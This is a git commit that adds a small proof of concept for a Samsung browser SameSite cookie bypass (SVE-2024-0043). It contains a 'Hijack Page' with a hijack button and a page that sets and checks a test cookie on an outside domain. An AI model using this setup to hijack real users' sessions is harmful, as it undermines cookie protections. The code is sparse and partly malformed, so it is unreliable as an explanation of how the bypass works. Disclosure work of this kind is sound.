5c7a3e86a9ea8ce9d3e88665f14ec47d4af33bfb
guruni13 <133293217+guruni13@users.noreply.github.com>
2024-02-19 20:54:31 +0900

    Add files via upload

---
+++ extnav/sve-2024-0043/attacker.php
@@ -0,0 +1,21 @@
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hijack Page</title>
+    <h> This is in controll of an attacker attacker</h>
+</head>
+<body>
+
+    <h1>Hijack Page</h1>
+
+    <!-- Add a button to trigger the "/hijack" logic -->
+    <form action="/samesitebypasssamsung/attacker.php" method="get">
+        <button type="submit" name="hijack">Click to Hijack</button>
+    </form>
+
+</body>
+</html>
---
+++ extnav/sve-2024-0043/poc.php
@@ -0,0 +1,52 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PHP File</title>
+</head>
+<body>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Same-Site Cookie Example</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 20px;
+        }
+
+        h1 {
+            color: #333;
+        }
+
+        a {
+            display: block;
+            margin-bottom: 15px;
+            color: #007bff;
+            text-decoration: none;
+        }
+
+        a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+
+    <a href="https://com.egghunter.in/setcookie.php?cookieName=SecretCookie&cookieValue=IUHUIGIGAIIGIGUIGSUIGIGIGSIGUIGUIFFTFDTRFYVUVBHJBHJ" target="_blank">1. First Set Same-Site Cookie</a>
+    <a href="https://com.egghunter.in/showcookie.php" target="_blank">2. Verify Same-Site Cookie Are Set Ot Not. If the browser is protecting the Same Site Cookies, you won't find the Same Site Script sent From Cross Domain in httpbin response</a>
+
+    
+
+</body>
+</html>
+
+
+    
+</body>
+</html>
